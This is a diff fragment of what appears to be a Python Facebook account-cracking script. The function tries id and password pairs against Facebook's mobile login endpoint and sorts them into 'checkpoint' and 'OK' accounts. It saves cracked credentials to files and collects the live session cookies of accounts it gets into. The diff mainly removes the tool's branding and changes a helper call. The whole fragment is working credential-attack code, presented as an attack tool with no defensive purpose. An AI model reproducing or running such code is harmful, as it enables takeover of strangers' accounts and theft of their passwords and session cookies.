@@ -1030,7 +1030,7 @@ def methodnew(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[yellow]Potrait-XD CP").add(f"[yellow]{idf}|{pw}")
+				tree.add(f"[yellow]CP").add(f"[yellow]{idf}|{pw}")
 				tree.add(f"[yellow]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1042,11 +1042,11 @@ def methodnew(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[green]Potrait-XD OK").add(f"[green]{idf}|{pw}")
+				tree.add(f"[green]OK").add(f"[green]{idf}|{pw}")
 				tree.add(f"[purple]{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				cek_apk(session,coki)
+				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
